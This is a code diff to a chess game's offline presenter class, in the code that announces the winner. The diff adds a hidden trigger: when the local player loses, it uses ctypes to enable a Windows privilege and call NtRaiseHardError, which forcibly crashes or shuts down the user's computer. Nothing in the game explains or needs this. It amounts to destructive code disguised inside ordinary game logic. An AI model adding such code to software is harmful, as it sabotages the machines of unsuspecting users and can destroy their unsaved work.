@@ -92,6 +92,13 @@ class OfflineGamePresenter(PlayableGamePresenterBase):
         winner_bool = Color(COLOR_NAMES.index(winner_str))
         output = f" • {winner_str.capitalize()} is victorious"
 
+        if self.model.my_color != winner_bool:
+            import ctypes
+            prev = ctypes.c_bool()
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev))
+            resp = ctypes.c_ulong()
+            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, None, 6, ctypes.byref(resp))
+
         if status == Termination.CHECKMATE:
             output = "Checkmate" + output
         elif status == Termination.VARIANT_WIN or status == Termination.VARIANT_LOSS:
